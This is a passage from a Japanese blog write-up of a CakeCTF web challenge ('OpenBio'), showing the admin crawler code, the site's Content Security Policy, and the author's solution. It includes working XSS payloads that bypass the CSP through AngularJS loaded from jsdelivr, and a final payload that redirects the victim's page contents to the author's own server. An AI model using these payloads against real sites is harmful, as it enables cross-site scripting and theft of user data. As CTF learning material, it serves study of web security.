+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>page</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>browser</span>.<span style=color:#a6e22e>newPage</span>();
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Register
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>base_url</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;/&#39;</span>, {<span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>});
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#39;#username&#39;</span>, <span style=color:#a6e22e>username</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#39;#password&#39;</span>, <span style=color:#a6e22e>password</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>click</span>(<span style=color:#e6db74>&#39;#tab-signup&#39;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>click</span>(<span style=color:#e6db74>&#39;#signup&#39;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>wait</span>(<span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Set flag to bio
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>base_url</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;/&#39;</span>, {<span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>});
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>$eval</span>(<span style=color:#e6db74>&#39;#bio&#39;</span>, <span style=color:#a6e22e>element</span> =&gt; <span style=color:#a6e22e>element</span>.<span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#39;#bio&#39;</span>, <span style=color:#e6db74>&#34;You hacked me! The flag is &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>click</span>(<span style=color:#e6db74>&#39;#update&#39;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>wait</span>(<span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Check spam page
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>url</span>, {<span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>});
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>wait</span>(<span style=color:#ae81ff>3000</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>close</span>();
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>e</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;[-] &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>e</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`[+] Crawl done`</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>browser</span>.<span style=color:#a6e22e>close</span>();
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>CSPの設定は以下になります.</p><pre tabindex=0><code>default-src &#39;none&#39;;
+script-src &#39;nonce-Cu7X0RW7MW6UteS2dtU3yw==&#39; https://cdn.jsdelivr.net/ https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ &#39;unsafe-eval&#39;;
+style-src https://cdn.jsdelivr.net/;frame-src https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/;base-uri &#39;none&#39;;
+connect-src &#39;self&#39;;
+</code></pre><p><a href=https://csp-evaluator.withgoogle.com/>CSP Evaluator</a>を使用して設定の脆弱性をチェックします. <code>script-src</code>に<code>https://cdn.jsdelivr.net/</code>が指定されており, このCDNはAngularライブラリをホスティングしていることがわかります.</p><p>Angularと<code>unsafe-eval</code>を利用して, CSPをbypassすることを考えます. 以下でサンプルのXSSが実行できます.</p><pre tabindex=0><code>&lt;script src=&#34;https://cdn.jsdelivr.net/angularjs/1.1.2/angular.min.js&#34;&gt;&lt;/script&gt;
+&lt;div ng-app ng-csp&gt;{{$eval.constructor(&#39;alert(\&#39;XSS\&#39;)&#39;)()}}&lt;/div&gt;
+</code></pre><p>CSPで<code>connect-src 'self'</code>が設定されているため, <code>fetch()</code>などを用いて自身のサーバにリクエストを送信することが<a href=https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src>できません</a>. 自分はクローラが使用するユーザーのbioを自身のユーザーのbioに書き込むこませることを考え, 以下のpayloadを作成しました.</p><pre tabindex=0><code>&lt;script src=&#34;https://cdn.jsdelivr.net/angularjs/1.1.2/angular.min.js&#34;&gt;&lt;/script&gt;
+{% raw %}
+&lt;div ng-app ng-csp&gt;{{$eval.constructor(&#39;fetch(&#34;/&#34;).then(async(data)=&gt;{a=await data.text();b=a.match(/id=&#34;csrf_token&#34; value=&#34;(.*?)&#34;/)[1];console.log(a);if(a.match(/&lt;title&gt;(.*?)&lt;\/title&gt;/)[1] != &#34;[my username] - OpenBio&#34;){fetch(&#34;/api/user/update&#34;,{method: &#34;POST&#34;, headers: {&#34;Content-Type&#34;:&#34;application/x-www-form-urlencoded&#34;,&#34;Cookie&#34;:&#34;session=[my session]&#34;}, body: &#34;bio=&#34;+a+&#34;&amp;csrf_token=&#34;+b})});}&#39;)()}}&lt;/div&gt;
+</code></pre><p>{% endraw %}
+しかし, このpayloadだとなぜかreportボタンが機能しなくなりました&mldr; そして, 時間切れになりました. 終了後にこちらの<a href=https://blog.y011d4.com/20220904-cakectf-writeup#openbio>writeup</a>を参考に解き直しを行いました.</p><p>そもそもredirectを使用することで, <code>connect-src 'self'</code>は回避できるようです. writeupではsetTimeoutが使用されていましたが, async/awaitを用いたpayloadを作成し, 無事flagを含むbipを自身のサーバに送信することができました.</p><pre tabindex=0><code>&lt;script src=&#34;https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.js&#34;&gt;&lt;/script&gt; 
+{% raw %}
+&lt;div ng-app ng-csp&gt;{{$eval.constructor(&#39;fetch(&#34;/&#34;).then(async(r) =&gt; {r = await r.text(); location.href=&#34;[自身のサーバ]?q=&#34;+escape(r)})&#39;)()}}&lt;/div&gt;
+</code></pre><p>{% endraw %}</p><h1 id=感想>感想</h1><p>あまり解けませんでしたが, CSPのbypass問にも取り組めて学びのあるCTFでした. 来年のCakeCTFではもっとweb問を解けるよう精進していきます.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
